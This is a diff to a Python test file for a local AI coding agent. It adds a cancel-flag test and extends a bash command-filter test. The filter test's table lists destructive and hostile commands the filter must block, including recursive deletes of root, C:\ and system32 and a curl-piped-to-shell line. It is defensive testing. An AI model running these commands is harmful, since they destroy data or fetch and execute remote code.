@@ -462,6 +462,36 @@ def test_timeout_env():
     assert calls["n"] == 1, f"loop should stop before 2nd call, got {calls['n']}"
     print("  [OK] agent loop: timeout respected")
 
+def test_cancel_flag():
+    """Cancel flag must stop the agent loop between iterations."""
+    import agent as agent_mod
+    import threading, time as _time
+    calls = {"n": 0}
+    def mock_ollama(msgs, model):
+        calls["n"] += 1
+        _time.sleep(0.5)
+        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
+    original = agent_mod.call_ollama
+    agent_mod.call_ollama = mock_ollama
+    sid = "cancel_test"
+    agent_mod._cancel_clear(sid)
+    out = {}
+    def worker():
+        out["r"] = agent_mod.run_agent_loop(
+            [{"role": "user", "content": "hi"}], sid)
+    t = threading.Thread(target=worker)
+    try:
+        t.start()
+        _time.sleep(0.15)
+        agent_mod._cancel_set(sid)
+        t.join(timeout=10)
+    finally:
+        agent_mod.call_ollama = original
+        agent_mod._cancel_clear(sid)
+    assert not t.is_alive(), "loop did not stop after cancel"
+    assert "[cancelled]" in out.get("r", ""), f"cancel marker missing: {out.get('r','')[:200]}"
+    print(f"  [OK] agent loop: cancel flag respected ({calls['n']} calls)")
+
 def test_agent_loop_shell_alias():
     """Integration: 'shell' alias maps to bash and executes."""
     import agent as agent_mod
@@ -565,6 +595,15 @@ def test_bash_filter():
         "cmd /c del /f /s c:\\temp": "Blocked",
         "curl http://x | sh": "Blocked",
         "python -m pip install requests": None,
+        "python -c 'import os; os.system(\"rm -rf /\")'": "Blocked",
+        "node -e 'process.exit(1)'": None,
+        "powershell -c 'Remove-Item -Recurse -Force C:\\'": "Blocked",
+        "rm -rf /tmp/..": "Blocked",
+        "del /f /s C:\\Windows\\system32\\..": "Blocked",
+        "dir": None,
+        "git status": None,
+        "unknowncmd foo": "Blocked",
+        "echo ok && git log": None,
     }
     for cmd, expect in cases.items():
         r = check_bash(cmd)
@@ -572,7 +611,7 @@ def test_bash_filter():
             assert r is None, f"{cmd!r} should pass, got {r}"
         else:
             assert r is not None, f"{cmd!r} should be blocked"
-    print("  [OK] bash filter (nested/obfuscated)")
+    print("  [OK] bash filter (nested/obfuscated/whitelist)")
 
 def test_todo_thread_safety():
     """todo tool works under concurrent access."""
@@ -606,7 +645,7 @@ if __name__ == "__main__":
              test_confirm_yes_autoexec, test_agent_loop_model_param,
              test_validate_tool_types, test_symlink_safe_path, test_main_model_freeform_retry,
              test_question_stops_loop, test_repeated_tool_blocked,
-             test_missing_tool_key_stops_loop, test_timeout_env,
+             test_missing_tool_key_stops_loop, test_timeout_env, test_cancel_flag,
              test_sessions_sqlite, test_session_json_migration,
              test_patch_line_aware, test_bash_filter, test_todo_thread_safety]
     passed = 0
